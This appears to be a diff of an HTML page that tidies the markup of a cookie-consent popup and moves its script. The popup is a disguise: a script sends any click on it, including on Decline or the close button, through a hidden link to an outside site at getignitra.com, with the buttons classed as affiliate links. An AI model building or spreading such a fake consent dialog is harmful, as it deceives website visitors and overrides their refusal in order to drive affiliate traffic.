@@ -157,26 +157,27 @@
 
 <body>
   <div class="background" id="background"></div>
+  <main role="main">
   <div class="modal" id="clicable">
     <button class="close-btn">×</button>
     <h2>Cookie Policy</h2>
     <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <span style="color: #0001ff;">Cookie Policy</span>.</p>
     <div class="buttons">
-      <button class="afiliate-link">Accept</a>
-      <button class="afiliate-link-close">Decline</a>
+      <button class="afiliate-link">Accept</button>
+      <button class="afiliate-link-close">Decline</button>
     </div>
   </div>
+  </main>
   <a id="goToPage" aria-label="go to your page" href="https://getignitra.com" ></a>
-  <script defer>
+  
+  <div class="" id="seo">  </div>
+</body>
+<script defer>
     document.getElementById("clicable").addEventListener("click", function (e) {
       e.stopPropagation();
       document.getElementById("goToPage").click();
     });
   </script>
-  <div class="" id="seo">
-    
-  </div>
-</body>
-
 
 </html>
+
